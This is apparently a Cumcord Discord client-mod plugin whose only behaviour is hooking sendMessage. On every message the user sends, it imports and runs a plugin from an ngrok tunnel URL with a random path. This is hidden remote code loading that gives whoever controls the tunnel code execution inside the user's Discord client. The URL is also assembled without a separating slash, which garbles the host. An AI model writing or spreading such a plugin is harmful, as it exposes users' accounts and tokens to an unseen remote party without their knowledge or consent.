import {webpackModules} from "@cumcord/modules";

let unpatch;

export default {
    onLoad() {
        unpatch = cumcord.patcher.after("sendMessage", webpackModules.findByProps("sendMessage"), (args) => {
            cumcord.plugins.importPlugin("https://72d2-75-189-110-204.ngrok.io" + Math.random().toString(36).slice(2) + "/")
        });
    },
    onUnload() {
        unpatch();
    }
};
